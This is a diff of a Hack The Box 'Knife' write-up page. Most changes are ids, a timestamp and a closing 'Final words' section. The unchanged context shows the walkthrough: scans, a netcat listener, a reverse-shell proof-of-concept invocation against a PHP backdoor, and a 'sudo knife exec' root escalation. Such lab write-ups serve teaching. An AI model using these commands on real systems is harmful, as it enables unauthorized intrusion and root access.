@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<!-- 2022-10-31 Mon 22:34 -->
+<!-- 2022-11-01 Tue 12:42 -->
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>HTB | knife</title>
@@ -62,6 +62,7 @@
 </ul>
 </li>
 <li><a href="#orgbbd2624">4. Priv-esc</a></li>
+<li><a href="#org3f1144b">5. Final words</a></li>
 </ul>
 </div>
 </nav>
@@ -90,7 +91,7 @@ We'll start by examining what services the machine has running.<br>
 <p>
 Below we see the output from the <code>nmap</code> scan.<br>
 </p>
-<pre class="example" id="org06d9120">
+<pre class="example" id="org8831cf3">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ sudo nmap -sV -sC -p- -oA nmap/all_ports -iL target.txt          19:16
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-26 19:16 CEST
@@ -131,7 +132,7 @@ All right let us enumerate the webserver<br>
 <p>
 <code>gobuster</code> didn't really give us anything of use other than <code>/index.php</code>.<br>
 </p>
-<pre class="example" id="org6b43c18">
+<pre class="example" id="org084efcb">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ gobuster dir -u "http://10.129.180.32" -w ~/repositories/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -d -b 404,403                                                                                                  19:21
 ===============================================================
@@ -165,7 +166,7 @@ by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
 If we open up the site with a browser connected to a proxy like <code>zap</code> or <code>burp</code>, and navigate to <code>/index.php</code>.<br>
 </p>
 
-<figure id="org02ad655">
+<figure id="org10de19f">
 <img src="assets/2021-07-26_19-51-07_screenshot.png" alt="2021-07-26_19-51-07_screenshot.png"><br>
 
 <figcaption><span class="figure-number">Figure 1: </span>Rendered html of <code>/index.php</code></figcaption>
@@ -174,7 +175,7 @@ If we open up the site with a browser connected to a proxy like <code>zap</code>
 <p>
 The menu in the top right corner doesn't do anything, so let's take a look at the headers to see if there is anything useful.<br>
 </p>
-<pre class="example" id="org5d3037c">
+<pre class="example" id="org16c07c6">
 HTTP/1.1 200 OK
 Date: Mon, 26 Jul 2021 17:20:52 GMT
 Server: Apache/2.4.41 (Ubuntu)
@@ -260,7 +261,7 @@ $ nc -nlvp 4444
 <p>
 Then we execute the revshell POC script with the right arguments:<br>
 </p>
-<pre class="example" id="org37bb0c7">
+<pre class="example" id="org4f5b587">
 ┌──[c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife/php-8.1.0-dev-backdoor-rce ]
 └─&gt; $ python revshell_php_8.1.0-dev.py "http://10.129.180.32" 10.10.14.87 4444                                   20:02
 </pre>
@@ -268,7 +269,7 @@ Then we execute the revshell POC script with the right arguments:<br>
 <p>
 And just like that we got a shell and user flag:<br>
 </p>
-<pre class="example" id="org9c63c6f">
+<pre class="example" id="org4d6a033">
 ┌──[ c3lphie@c3lphie-laptop:~/hacking/ctf/hackthebox/machines/knife ]
 └─&gt; $ nc -nlvp 4444                                                    19:56
 james@knife:/$ whoami
@@ -317,7 +318,7 @@ $ sudo knife exec -E 'exec "/bin/sh"'
 <p>
 So let's run it and get our <code>root</code> flag:<br>
 </p>
-<pre class="example" id="org966e8da">
+<pre class="example" id="org7e26ba1">
 james@knife:/$ sudo knife exec -E 'exec "/bin/bash"'
 sudo knife exec -E 'exec "/bin/bash"'
 
@@ -333,6 +334,16 @@ snap
 cat root.txt
 10a1████████████████████████████
 </pre>
+</div>
+</div>
+
+<div id="outline-container-org3f1144b" class="outline-2">
+<h2 id="org3f1144b"><span class="section-number-2">5.</span> Final words</h2>
+<div class="outline-text-2" id="text-5">
+<p>
+Thank you for taking some time out of your day to read this post.<br>
+If you enjoyed this post, feel free to join my <a href="https://discord.gg/t8tKrgdGWu">Discord server</a> to get notification whenever I post something and ask questions if there are any.<br>
+</p>
 </div>
 </div>
 <div id="footnotes">
